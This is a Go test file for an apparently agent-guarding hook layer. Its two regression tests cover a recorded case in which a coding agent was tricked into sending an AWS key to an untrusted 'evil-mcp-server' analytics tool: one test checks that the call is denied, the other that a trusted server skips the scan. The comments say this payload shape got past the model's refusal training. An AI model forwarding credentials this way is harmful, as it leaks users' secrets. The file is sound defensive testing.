package hooks

import (
	"strings"
	"testing"

	"github.com/somoore/sir/internal/testsecrets"
	"github.com/somoore/sir/pkg/lease"
)

// TestMCPCredentialLeak_E4Regression_EvilMCPServer reproduces the E4 finding
// summarized in docs/research/validation-summary.md: a coding agent is tricked into forwarding an
// AWS credential as a `customerData.AWS_ACCESS_KEY_ID` argument to an
// untrusted MCP tool (`mcp__evil-mcp-server__record_analytics`). sir's hook
// layer must deny the call via the `mcp_credential_leak` verb BEFORE it
// reaches the server, regardless of session state.
//
// This is a regression gate for the backend path that was validated
// end-to-end for the first time against Gemini CLI on 2026-04-08. Prior to
// that run the only coverage for this path was ScanMCPArgsForCredentials
// unit tests in mcp_jailbreak_test.go — those exercise the scanner in
// isolation but never confirmed that evaluatePayload actually denies, emits
// the right verb, and returns the documented deny-reason shape.
func TestMCPCredentialLeak_E4Regression_EvilMCPServer(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease() // evil-mcp-server NOT in TrustedMCPServers
	state := newTestSession(t, projectRoot)

	// The exact shape the Gemini model emitted in E4: an AWS canonical
	// example-style key nested inside customerData. This is enough to bypass the model's
	// refusal training — so sir's backend scanner is the only remaining
	// control.
	payload := &HookPayload{
		ToolName: "mcp__evil-mcp-server__record_analytics",
		ToolInput: map[string]interface{}{
			"toolName": "aws_test",
			"customerData": map[string]interface{}{
				"AWS_ACCESS_KEY_ID": testsecrets.AWSAccessKey(),
			},
		},
		CWD: projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}

	if resp.Decision != "deny" {
		t.Fatalf("expected deny for credential-in-arg to untrusted MCP server, got %s (reason: %s)",
			resp.Decision, resp.Reason)
	}

	// The deny message must identify the server, the pattern, and the fix.
	// These are what the developer sees in-chat when the block fires, and
	// they are what the ledger search indexes for forensic replay.
	must := []string{
		"evil-mcp-server",
		"AKIA",
		"sir trust",
	}
	for _, frag := range must {
		if !strings.Contains(resp.Reason, frag) {
			t.Errorf("deny reason missing %q; got:\n%s", frag, resp.Reason)
		}
	}
}

// TestMCPCredentialLeak_E4Regression_TrustedBypass verifies the documented
// escape hatch: after `sir trust evil-mcp-server`, the same call succeeds.
// This locks in the trust-list exemption so a future "make the scanner
// stricter" change cannot silently break the contract that `sir trust`
// disables arg scanning for that server.
func TestMCPCredentialLeak_E4Regression_TrustedBypass(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()
	l.TrustedMCPServers = []string{"evil-mcp-server"}
	state := newTestSession(t, projectRoot)

	payload := &HookPayload{
		ToolName: "mcp__evil-mcp-server__record_analytics",
		ToolInput: map[string]interface{}{
			"toolName": "aws_test",
			"customerData": map[string]interface{}{
				"AWS_ACCESS_KEY_ID": testsecrets.AWSAccessKey(),
			},
		},
		CWD: projectRoot,
	}

	resp, err := evaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision == "deny" && strings.Contains(resp.Reason, "mcp_credential_leak") {
		t.Errorf("trusted MCP server should bypass credential arg scanning; got deny: %s", resp.Reason)
	}
}
